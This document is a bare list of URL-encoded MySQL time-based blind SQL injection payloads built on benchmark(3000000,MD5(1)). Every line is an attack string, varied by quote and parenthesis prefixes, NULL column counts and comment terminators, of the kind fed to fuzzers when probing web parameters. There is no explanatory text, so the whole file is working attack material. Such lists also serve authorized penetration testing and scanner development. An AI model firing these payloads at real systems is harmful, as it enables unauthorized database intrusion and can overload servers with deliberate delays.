+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
and 0=benchmark(3000000,MD5(1))%20/*
 and 0=benchmark(3000000,MD5(1))%20--
 and 0=benchmark(3000000,MD5(1))%20%23
' and 0=benchmark(3000000,MD5(1))%20/*
' and 0=benchmark(3000000,MD5(1))%20--
' and 0=benchmark(3000000,MD5(1))%20%23
" and 0=benchmark(3000000,MD5(1))%20/*
" and 0=benchmark(3000000,MD5(1))%20--
" and 0=benchmark(3000000,MD5(1))%20%23
) and 0=benchmark(3000000,MD5(1))%20/*
) and 0=benchmark(3000000,MD5(1))%20--
) and 0=benchmark(3000000,MD5(1))%20%23
)) and 0=benchmark(3000000,MD5(1))%20/*
)) and 0=benchmark(3000000,MD5(1))%20--
)) and 0=benchmark(3000000,MD5(1))%20%23
))) and 0=benchmark(3000000,MD5(1))%20/*
))) and 0=benchmark(3000000,MD5(1))%20--
))) and 0=benchmark(3000000,MD5(1))%20%23
)))) and 0=benchmark(3000000,MD5(1))%20/*
)))) and 0=benchmark(3000000,MD5(1))%20--
)))) and 0=benchmark(3000000,MD5(1))%20%23
') and 0=benchmark(3000000,MD5(1))%20/*
') and 0=benchmark(3000000,MD5(1))%20--
') and 0=benchmark(3000000,MD5(1))%20%23
") and 0=benchmark(3000000,MD5(1))%20/*
") and 0=benchmark(3000000,MD5(1))%20--
") and 0=benchmark(3000000,MD5(1))%20%23
')) and 0=benchmark(3000000,MD5(1))%20/*
')) and 0=benchmark(3000000,MD5(1))%20--
')) and 0=benchmark(3000000,MD5(1))%20%23
")) and 0=benchmark(3000000,MD5(1))%20/*
")) and 0=benchmark(3000000,MD5(1))%20--
")) and 0=benchmark(3000000,MD5(1))%20%23
'))) and 0=benchmark(3000000,MD5(1))%20/*
'))) and 0=benchmark(3000000,MD5(1))%20--
'))) and 0=benchmark(3000000,MD5(1))%20%23
"))) and 0=benchmark(3000000,MD5(1))%20/*
"))) and 0=benchmark(3000000,MD5(1))%20--
"))) and 0=benchmark(3000000,MD5(1))%20%23
')))) and 0=benchmark(3000000,MD5(1))%20/*
')))) and 0=benchmark(3000000,MD5(1))%20--
')))) and 0=benchmark(3000000,MD5(1))%20%23
")))) and 0=benchmark(3000000,MD5(1))%20/*
")))) and 0=benchmark(3000000,MD5(1))%20--
")))) and 0=benchmark(3000000,MD5(1))%20%23
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
